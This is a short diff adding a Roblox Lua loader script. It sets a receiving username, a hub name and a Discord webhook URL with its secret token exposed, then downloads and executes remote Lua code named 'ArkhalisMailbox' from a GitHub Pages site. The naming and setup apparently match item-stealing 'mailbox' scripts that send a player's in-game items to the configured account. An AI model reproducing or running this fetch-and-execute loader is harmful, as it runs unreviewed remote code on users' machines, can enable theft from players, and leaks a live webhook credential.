@@ -1,0 +1,6 @@
+ _G.Username = "Basia_123864"
+_G.HubName = "lol"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1103242519371849738/NrkoARUVr-sBU4cI3trcPVcGLr1PpFQu_JQHYb2cUmIjanNwz6OmqgdGdcGT22RPVZ-1"
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisMailbox.lua"))()
+
